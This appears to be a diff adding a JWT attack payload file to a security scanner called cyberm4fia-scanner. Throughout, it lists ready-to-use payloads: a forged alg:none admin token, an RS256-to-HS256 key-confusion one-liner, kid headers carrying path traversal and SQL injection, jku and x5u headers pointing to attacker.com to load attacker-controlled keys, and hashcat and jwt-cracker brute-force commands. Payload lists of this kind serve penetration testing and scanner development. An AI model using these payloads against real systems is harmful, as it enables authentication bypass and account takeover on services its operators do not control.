@@ -1,0 +1,39 @@
+# JWT Attack Payloads — cyberm4fia-scanner
+# Categories: alg:none, Key Confusion, Injection, Brute Force
+
+# ─── alg:none ───
+# Header: {"alg":"none","typ":"JWT"}
+# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# ─── RS256→HS256 Key Confusion ───
+# Use the PUBLIC key as HMAC secret (sign with RS256 public key as HS256)
+# python3 -c "import jwt; token = jwt.encode({'user':'admin'}, open('public.pem').read(), algorithm='HS256')"
+
+# ─── kid Parameter Injection ───
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"file:///dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"' OR 1=1 --"}
+{"alg":"HS256","typ":"JWT","kid":"key1\x0a\x0a"}
+
+# ─── jwk Header Injection ───
+{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","kid":"x","n":"..."}}
+
+# ─── jku Header Injection ───
+{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
+
+# ─── x5u Header Injection ───
+{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
+
+# ─── crit Header Abuse ───
+{"alg":"RS256","typ":"JWT","crit":["exp"],"exp":null}
+
+# ─── alg:none Case Variants ───
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+
+# ─── Weak Secret Brute Force ───
+# hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+# jwt-cracker <token> -d 6
